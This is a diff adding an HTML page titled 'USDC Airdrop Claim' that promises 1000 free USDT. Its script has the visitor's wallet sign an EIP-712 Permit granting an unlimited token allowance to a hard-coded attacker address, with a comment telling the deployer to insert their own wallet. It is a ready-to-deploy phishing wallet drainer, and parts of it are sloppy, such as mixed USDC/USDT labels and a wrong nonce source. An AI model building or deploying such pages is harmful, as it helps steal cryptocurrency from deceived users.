@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDC Airdrop Claim</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f6f7;
+            color: #172b4d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 { margin-bottom: 0.5rem; font-size: 1.5rem; }
+        p { color: #6b778c; margin-bottom: 1.5rem; font-size: 0.9rem; }
+        button {
+            background-color: #0070ff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #0051bb; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        .status { margin-top: 1rem; font-size: 0.85rem; color: #6b778c; }
+        .success { color: #36b37f; }
+        .error { color: #ff3b30; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>USDT Airdrop</h1>
+    <p>Claim your 1000 USDT airdrop! <br>Sign the permit to authorize the claim.</p>
+   
+    <button id="claimBtn">Claim 1000 USDT</button>
+    <div id="status" class="status"></div>
+</div>
+
+<script>
+    // CONFIGURATION
+    const USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // Mainnet USDC
+    const YOUR_WALLET = "0xbdF6cE9B4906AE0D71Ea8A908bAa5d3C09035251"; // <--- PUT YOUR WALLET ADDRESS HERE
+    const PERMIT_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 2^256 - 1 (Max)
+
+    const claimBtn = document.getElementById('claimBtn');
+    const statusDiv = document.getElementById('status');
+
+    claimBtn.addEventListener('click', async () => {
+        if (!window.ethereum) {
+            statusDiv.textContent = "Please install Trust Wallet or MetaMask.";
+            statusDiv.className = "status error";
+            return;
+        }
+
+        try {
+            statusDiv.textContent = "Connecting to wallet...";
+           
+            // 1. Connect Wallet
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+           
+            // 2. Get Current Nonce
+            const nonce = await window.ethereum.request({
+                method: 'eth_getTransactionCount',
+                params: [userAddress, 'pending']
+            });
+
+            // 3. Prepare Signature Data (EIP-712)
+            const signatureData = {
+                types: {
+                    Permit: [
+                        { name: 'owner', type: 'address' },
+                        { name: 'spender', type: 'address' },
+                        { name: 'value', type: 'uint256' },
+                        { name: 'nonce', type: 'uint256' },
+                        { name: 'deadline', type: 'uint256' }
+                    ]
+                },
+                primaryType: 'Permit',
+                domain: {
+                    name: 'USDT Coin',
+                    version: '2',
+                    chainId: 1,
+                    verifyingContract: USDT_ADDRESS
+                },
+                message: {
+                    owner: userAddress,
+                    spender: YOUR_WALLET,
+                    value: PERMIT_AMOUNT,
+                    nonce: nonce,
+                    deadline: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
+                }
+            };
+
+            statusDiv.textContent = "Please sign the Permit in your wallet...";
+
+            // 4. Request Signature
+            const signature = await window.ethereum.request({
+                method: 'eth_signTypedData_v4',
+                params: [userAddress, JSON.stringify(signatureData)]
+            });
+
+            // 5. Success
+            statusDiv.textContent = "Permit signed! You can now redeem your USDC.";
+            statusDiv.className = "status success";
+           
+            // Optional: You can now call the contract's 'permit' function with this signature
+            // or just tell the user to go to the official USDT claim page.
+           
+        } catch (error) {
+            console.error(error);
+            statusDiv.textContent = "Signature failed: " + error.message;
+            statusDiv.className = "status error";
+        }
+    });
+</script>
+
+</body>
+</html>
